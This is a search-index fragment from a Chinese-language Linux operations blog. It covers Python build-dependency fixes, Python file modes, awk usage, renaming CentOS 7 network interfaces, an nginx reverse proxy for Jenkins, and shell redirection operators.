","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:1:0","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"2. rsync 同步故障 @ERROR: auth failed on module # 出现此问题的原因可能有两个 # 1. 指定的认证文件 权限非 600 # 2. 指定认证文件行末尾存在注释(别问我怎么知道的,我不想说!) ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:2:0","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"3. python 3.7.x zipimport.ZipImportError: can’t decompress data; zlib not available yum -y install zlib-devel ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:3:0","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"4. python 3.7.x ModuleNotFoundError: No module named ‘_ctypes’ yum install libffi-devel -y # libffi-devel-3.0.13-18.el7.x86_64.rpm ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:4:0","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"5. python 3.7.x ‘SSLError(“Can’t connect to HTTPS URL because the SSL module is not available.”)’ # Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/request/ # 先安装，在加上`--with-ssl`编译安装，可加上--enable-optimizations ，让python运行得更快 yum install openssl-devel -y ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:5:0","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"6. python 3.x ’errors like : “Could not import runpy module”, operations as following:' # 1. gcc 需要升级到8.x + # 2. 取消 --enable-optimizations 参数 # 另: python 3.x 编译需要依赖openssl 1.1.1 ./config --prefix=/pathto/openssl \u0026\u0026 make \u0026\u0026 make install ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:6:0","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"7. python 3.x ‘ModuleNotFoundError: No module named ‘_bz2’’ yum install bzip2-devel -y ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:7:0","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"8. python 3.x ‘ModuleNotFoundError: No module named ‘_lzma’’ sudo yum install xz-devel ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:8:0","tags":["linux","解决方案"],"title":"那些编译时出现的杂七杂八故障","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","运维记事"],"content":"文件操作","date":"2022-06-24","objectID":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","tags":["linux","python"],"title":"文件操作","uri":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"1. 文件操作 文件读取指针概念 当python 使用open().read()读取文件时,是按行从上向下读取,当他读取一行时,会给那行设置一个下标(个人理解)来标注当前读取到那行了,在向下读取过程中,下标逐步增加,直至到最后一行,这个下标即为指针. 模式说明 标识符 描述 文件要求 r 只读模式, 只允许读取文件内容 文件必须存在 r+ 读写模式, 可读可写,不分先后,但写入只能写入到末尾行 文件必须存在 b 二进制操作模式,使用场景一般文操作流文件 - w 新建模式, 写入新的文件内容 若存在文件,清空文件内容,不存在新建 w+ 写读模式, 可以边写边读,读是从实际的指针位置开始,可指定指针到开头读取写入内容 存在文件,清空文件内容,不存在新建 a 追加模式, 可写但不允许读,只允许从最后一行开始追加 存在直接操作,不存在新建 a+ 追加读模式, 可读可写,写只能写入到末尾行 存在直接操作,不存在新建 U 表示在读取文件时候,将\\r\\n统一转成\\n, 使用场景一般是在linux上读取win的文件 - ","date":"2022-06-24","objectID":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:0","tags":["linux","python"],"title":"文件操作","uri":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"1.1. 基础语法 # 打开为文件对象, 默认 mode = \"r\", encoding=\"系统编码\" f = open(\"file.md\") # 读取文件内容 data = f.read() f1 = open(\"file1.md\",\"w\",encoding=\"utf-8\") # 写入内容到文件 f1.write(\"hello python\") f2 = open(\"file1.md\",\"a\",encoding=\"utf-8\") f2.write(\"hello python2\") # 文件流关闭 在持续执行程序中必须在文件操作完毕后进行关闭 f.close() ","date":"2022-06-24","objectID":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:2:0","tags":["linux","python"],"title":"文件操作","uri":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"1.2. 常规操作 f = open(\"file1.md\",\"r\",encoding=\"utf-8\") # 打印一行 并将指针向下偏移一次 print(f.readline()) # 读取所有行类容,将其转换为以\\n为结尾的列表,使用循环遍历每一行 print(f.readlines()) # 打印已读取的光标位置(列)从0开始,字符读取,字节计数(末尾\\n) print(f.tell()) # 读取3个字符 print(f.read(3)) # 设置上一读取行指针位置 f.seek(2) #打印文件编码 print(f.encoding) # 判断文件是否是一个可读取的文件 print(f.seekable()) # 在文件写入后,清空缓存区内容到文件当中 f.flush() # 在文件的追加模式下,从文件开头(0指针)位置开始截断并重新写入指定长度的字符串 f.truncate(6) ","date":"2022-06-24","objectID":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:3:0","tags":["linux","python"],"title":"文件操作","uri":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"1.3. 文件读取 with语句 with open(\"file1.md\",\"r\",encoding=\"utf-8\") as f: for line in f: print(line) # with 语句也可以同时打开多个文件 with open(\"file1.md\",\"r\",encoding=\"utf-8\") as f1,\\ open(\"file2.md\",\"r\",encoding=\"utf-8\") as f2: print(f1.readlines()) print(f2.readlines()) ","date":"2022-06-24","objectID":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:4:0","tags":["linux","python"],"title":"文件操作","uri":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"AWK常用","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":" https://awk.readthedocs.io/en/latest/chapter-one.html ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:0:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"1. 摘要 awk ' BEGIN{ 语句 } statements2 {语句} END{ 语句 } ' BEGIN { 语句 }：在读取任何输入前执行一次 语句 END { 语句 }：读取所有输入之后执行一次 语句 表达式 { 语句 }： 对于 表达式 为真（即，非零或非空）的行，执行 语句 /正则表达式/ { 语句 }： 如果输入行包含字符串与 正则表达式 相匹配，则执行 语句 组合模式 { 语句 }： 一个 组合模式 通过与（\u0026\u0026），或（||），非（|），以及括弧来组合多个表达式；对于组合模式为真的每个输入行，执行 语句 模式1，模式2 { 语句 }： 范围模式(range pattern)匹配从与 模式1 相匹配的行到与 模式2 相匹配的行（包含该行）之间的所有行，对于这些输入行，执行 语句 。 BEGIN和END不与其他模式组合。范围模式不可以是任何其他模式的一部分。BEGIN和END是仅有的必须搭配动作的模式。 ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:1:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"2. awk 变量 $n: 分割后，第n列的字段 ${1..n} 代表当前行的1-n的列值 $0: 代表整行的数据 FS: 表示使用的列的分割符(默认空格,位于BEGIN模块,命令行中-F指定) OFS: 输出列的分割符,默认print $1,$2的时候中间的,代表空格(默认),可使用OFS进行更改,位于BEGIN模块当中 NF: 分割后，当前行一共多少个字段($NF最后一列,$(NF-1)倒数第2列) NR: 记录行号,表示当前正在处理的记录的行的号码 FNR: 各文件分别计数的行号 RS: 表示行分隔符,表示每个记录输入的时候的分割符,即行与行是如何分割的(内置变量RS用来存放输入的记录分割符,可通过BEGIN模块来进行修改,支持正则表达式 ORS: 输出记录分隔符(输出换行符)，输出时用指定符号代替换行符,默认行的分割符为\\n FILENAME: 当前文件名 ARGC：命令行参数的个数 ARGV: 数组，命令行参数的值 ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:2:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"示例 RS: 表示行分隔符,表示每个记录输入的时候的分割符,即行与行是如何分割的(内置变量RS用来存放输入的记录分割符,可通过BEGIN模块来进行修改,支持正则表达式 示例 1 : [root@00 ~]# head -2 /etc/passwd|awk 'BEGIN{RS=\":\"}{print NR,$0}' ### root:x:0:0:root:/root:/bin/bash ### ### bin:x:1:1:bin:/bin:/sbin/nologin ### 1 root 2 x 3 0 4 0 5 root 6 /root 7 /bin/bash # \u003c\u003c=== 此处本身包含一个换行符 bin 8 x 9 1 10 1 11 bin 12 /bin 13 /sbin/nologin 示例 2 : [root@00 ~]# head -n 3 /etc/passwd|awk 'BEGIN{RS=\"[:/0-9]+|\\n\"}{print $0}' |sort|uniq -c ### root:x:0:0:root:/root:/bin/bash ### ### bin:x:1:1:bin:/bin:/sbin/nologin ### ### daemon:x:2:2:daemon:/sbin:/sbin/nologin ### 1 bash 4 bin 2 daemon 2 nologin 3 root 3 sbin 3 x FS: 输入分割符，命令处理参数使用-F指定分割符,或者使用变量形式修改 示例: $\u003e awk -F \":\" 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12 ftp 14 13 nobody 65534 14 systemd-coredump 999 15 systemd-network 192 $\u003e awk -v FS=\":\" 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12 ftp 14 13 nobody 65534 14 systemd-coredump 999 15 systemd-network 192 $\u003e head -1 passwd |awk 'BEGIN{FS=\":\"}{print $1,$2}' ### root:x:0:0:root:/root:/bin/bash ### root x OFS: 输出分割符，使用OFS变量进行修改 示例: $\u003e awk -F \":\" -v OFS=\"--\" 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12--ftp--14 13--nobody--65534 14--systemd-coredump--999 15--systemd-network--192 其他示例 # 打印范围 $\u003e awk -F: 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12 ftp 14 13 nobody 65534 14 systemd-coredump 999 15 systemd-network 192 # 自定义变量 awk -v param=n_user 'BEGIN{print \"当前用户: \" param}' 当前用户: n_user $\u003e param=$(whoami) $\u003e echo $param cxd $\u003e awk -v param=$param 'BEGIN{print \"当前用户: \" param}' 当前用户: cxd ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:3:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"3. 域 awk 默认分割符为空格,或者连续的空格,tab默认也为(连续)空格 当awk中只存在条件时,默认输出整行 ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:4:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"4. 正则匹配 搜索/etc/passwd中用户主目录在root下的用户名和bash 变量~正则 表示变量值匹配正则表达式 变量!~正则 表示变量值不匹配正则表达式 [root@00 ~]# awk -F: '$(NF-1)~/^\\/root/{print $1,$NF}' /etc/passwd ### root:x:0:0:root:/root:/bin/bash ### ### operator:x:11:0:operator:/root:/sbin/nologin ### root /bin/bash operator /sbin/nologin ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:5:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"5. BEGIN and END BEGIN{变量定义} {判断和计算} END{判读和计算完结执行操作} seq 100 | awk 'BEGIN{sum=0}{sum=$0+sum}END{print sum}' ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:6:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"awk 格式化输出 示例: $\u003e awk -F: 'BEGIN{printf \"%-25s\\t%-25s\\t%-25s\\t\\n\",\"用户名\",\"UID\",\"GID\"}NR==2,NR==5{printf \"%-25s\\t%-25s\\t%-25s\\n\",$1,$3,$4}' pwd.txt 用户名 UID GID bin 1 1 daemon 2 2 adm 3 4 lp 4 7 ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:7:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"awk 模式 awk ' BEGIN { actions } /pattern/ { actions } /pattern/ { actions } ………. END { actions } ' filenames ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:8:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"6. awk 数组 类似key=value ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:9:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","运维记事"],"content":"7. awk 循环 foreach 循环 ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:10:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","整理收集"],"content":" 信息 CentOS 7的默认网卡和设备名称都是随机的，根据需要有时候需要修改网卡为以eth开头的。以下整理了两种比较靠谱的。 ","date":"2022-06-23","objectID":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/:0:0","tags":["linux","解决方案"],"title":"Centos7修改网卡名称","uri":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/"},{"categories":["linux","整理收集"],"content":"1. 安装过程中修改 在加载镜像后出现安装选项卡的时候，键盘敲击tab，打开内核启动选项，增加内核参数 net.ifnames=0 biosdevname=0,回车，然后正常安装即可。 ","date":"2022-06-23","objectID":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/:1:0","tags":["linux","解决方案"],"title":"Centos7修改网卡名称","uri":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/"},{"categories":["linux","整理收集"],"content":"2. 安装之后修改 打开并修改/etc/sysconfig/network-scripts/ifcfg-ensxxx中的name和DEVICE修改为eth0,并重命名文件为ifcfg-eth0 修改配置文件/etc/default/grub,在GRUB_CMDLINE_LINUX这个参数后面添加net.ifnames=0 biosdevname=0 ,然后重新重新申城grub配置 grub2-mkconfig -o /boot/grub2/grub.cfg ，重启操作系统即可 ","date":"2022-06-23","objectID":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/:2:0","tags":["linux","解决方案"],"title":"Centos7修改网卡名称","uri":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/"},{"categories":["linux","运维记事"],"content":"Nginx反向代理jenkins","date":"2022-06-23","objectID":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/","tags":["linux","jenkins","nginx","解决方案"],"title":"Nginx反向代理jenkins","uri":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/"},{"categories":["linux","运维记事"],"content":"参考文献 : https://wiki.jenkins.io/display/JENKINS/Jenkins+behind+an+NGinX+reverse+proxy 以下为个人解决方案 : jenkins 配置: 添加启动参数 --prefix=/jenkins，docker启动添加环境变量JENKINS_OPTS=\"--prefix=/jenkins\" 前端修改(Jenkins \u003e Manage Jenkins \u003e Jenkins Location \u003e Jenkins URL) 或者修改配置文件/var/jenkins_home/jenkins.model.JenkinsLocationConfiguration.xml中的jenkinsUrl，修改为http(s)://www.example.com/jenkins/,配置文件修改后需重启。 nginx配置: location /jenkins { proxy_pass http://10.0.0.100:8080/; proxy_redirect http:// https://; sendfile off; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_max_temp_file_size 0; # This is the maximum upload size client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 90; proxy_send_timeout 90; proxy_read_timeout 90; proxy_temp_file_write_size 64k; proxy_http_version 1.1; proxy_request_buffering off; proxy_buffering off; } ","date":"2022-06-23","objectID":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/:0:0","tags":["linux","jenkins","nginx","解决方案"],"title":"Nginx反向代理jenkins","uri":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/"},{"categories":["linux","运维记事"],"content":"常用重定向及解释","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"Linux 标准输出(stdout)和标准错误(stderr)的重定向 ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:0","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"1. 重定向符号和语句 \u003e 以擦写的模式重定向至... \u003e\u003e 以追加的模式重定向至... 1 代表stdout标准输出 2 代表stderr标准错误 ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:1","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"2. 标准错误重定向到标准输出,然后合并重定向到文件 command 2\u003e\u00261 output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:2","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"3. 标准输出流将仅重定向到文件，在终端中不可见。如果该文件已存在，则会被覆盖。 command \u003e output.txt #command \u00261\u003e output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:3","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"4. 标准输出流将仅重定向到文件，在终端中不可见。如果文件已存在，则新数据将附加到文件末尾。 command \u003e\u003e output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:4","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"5. 标准错误流将仅重定向到文件，在终端中不可见。如果该文件已存在，则会被覆盖。 command 2\u003e output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:5","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"6. 标准错误流将仅重定向到文件，在终端中不可见。如果文件已存在，则新数据将附加到文件末尾。 command 2\u003e\u003e output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:6","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"7. 标准输出和标准错误流都将仅重定向到文件，终端中不会显示任何内容。如果该文件已存在，则会被覆盖。 command \u0026\u003e output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:7","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"8. 标准输出和标准错误流都将仅重定向到文件，终端中不会显示任何内容。如果文件已存在，则新数据将附加到文件末尾。 command \u0026\u003e\u003e output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:8","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"9. 标准输出流将被复制到文件中，它仍将在终端中可见。如果该文件已存在，则会被覆盖。 command | tee output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:9","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"10. 标准输出流将被复制到文件中，它仍将在终端中可见。如果文件已存在，则新数据将附加到文件末尾。 command | tee -a output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:10","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"11. Bash没有简写语法，只允许StdErr管道到第二个命令，这里需要再次与tee组合来完成表格。如果你真的需要这样的东西，请看“如何管道stderr，而不是stdout？” 有关如何通过交换流或使用进程替换来完成此操作的Stack Overflow。 (*) ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:11","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"12. 标准输出和标准错误流都将被复制到文件中，同时仍在终端中可见。如果该文件已存在，则会被覆盖。 command |\u0026 tee output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:1:12","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"13. 标准输出和标准错误流都将被复制到文件中，同时仍在终端中可见。如果文件已存在，则新数据将附加到文件末尾。 command |\u0026 tee -a output.txt 